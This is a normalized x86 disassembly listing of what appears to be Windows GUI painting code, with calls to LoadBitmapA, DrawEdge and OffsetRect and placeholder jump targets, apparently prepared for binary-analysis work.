mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_420c38
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_450747
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_426878
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42046c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0c4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_420c38
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4278d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c0c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421194
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d3b4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c38
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4500b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_420738
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_420f30
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42046c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4032e8
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4500b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450bef
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f174
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4500b0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_450c08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_451510
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_420c38
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42046c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404444
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_420c38
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0c4
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_420c38
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_420c38
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4278d4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c0c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421010
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425790
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_451053
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_426878
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42046c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d0c4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_420c38
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_4500b0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_420738
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42146c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_421194
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
